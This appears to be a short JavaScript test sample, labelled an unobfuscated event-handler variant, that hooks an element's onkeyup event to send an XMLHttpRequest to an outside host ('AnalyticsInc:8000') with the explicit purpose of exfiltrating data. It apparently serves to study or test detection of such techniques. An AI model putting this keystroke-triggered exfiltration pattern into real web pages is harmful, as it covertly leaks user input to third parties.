// Event Handler - No Obfuscation
// Exfiltrate data using XMLHTTP request
var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=onkeyup3", true);xmlhttp.send(null);';
document.getElementById('test').onkeyup = Function(exp);